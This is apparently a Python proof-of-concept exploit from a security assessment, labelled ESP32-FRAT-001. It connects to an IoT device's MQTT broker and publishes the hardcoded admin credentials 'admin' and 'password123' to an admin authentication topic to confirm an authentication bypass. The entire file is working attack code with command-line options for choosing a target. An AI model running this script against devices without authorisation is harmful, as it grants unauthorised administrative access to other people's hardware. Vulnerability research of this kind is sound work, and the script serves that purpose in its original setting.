#!/usr/bin/env python3
"""
poc_hardcoded_creds.py - Exploit ESP32-FRAT-001 (Hardcoded Credentials)
Demonstrates authentication bypass using embedded admin password
"""

import paho.mqtt.client as mqtt
import argparse
import sys

class CredentialExploit:
    def __init__(self, target_ip, target_port=1883):
        self.target_ip = target_ip
        self.target_port = target_port
        self.authenticated = False
        
        self.client = mqtt.Client()
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] Connected to {self.target_ip}:{self.target_port}")
            # Subscribe to admin topic
            client.subscribe("device/admin/response")
        else:
            print(f"[-] Connection failed: {rc}")
            sys.exit(1)
    
    def on_message(self, client, userdata, msg):
        payload = msg.payload.decode('utf-8')
        print(f"[*] Response: {payload}")
        
        if "authenticated" in payload.lower():
            self.authenticated = True
            print("[+] AUTHENTICATION SUCCESSFUL")
            print("[*] Device accepted hardcoded credentials")
    
    def exploit(self, username="admin", password="password123"):
        """Send hardcoded credentials to device"""
        print(f"[*] Targeting {self.target_ip}:{self.target_port}")
        print(f"[*] Using credentials: {username}:{password}")
        
        try:
            self.client.connect(self.target_ip, self.target_port, keepalive=60)
            self.client.loop_start()
            
            # Publish authentication request
            auth_payload = f'{{"username": "{username}", "password": "{password}"}}'
            print(f"\n[*] Sending auth request...")
            self.client.publish("device/admin/auth", auth_payload, qos=1)
            
            # Wait for response
            import time
            time.sleep(3)
            
            if self.authenticated:
                print("\n[+] VULNERABILITY CONFIRMED: Device accepts hardcoded credentials")
                return True
            else:
                print("\n[-] Authentication failed")
                return False
        
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
        finally:
            self.client.disconnect()

def main():
    parser = argparse.ArgumentParser(description="ESP32-FRAT-001 POC Exploit")
    parser.add_argument("--target", required=True, help="Target device IP address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT port (default: 1883)")
    parser.add_argument("--username", default="admin", help="Username (default: admin)")
    parser.add_argument("--password", default="password123", help="Password (default: password123)")
    
    args = parser.parse_args()
    
    exploit = CredentialExploit(args.target, args.port)
    success = exploit.exploit(args.username, args.password)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
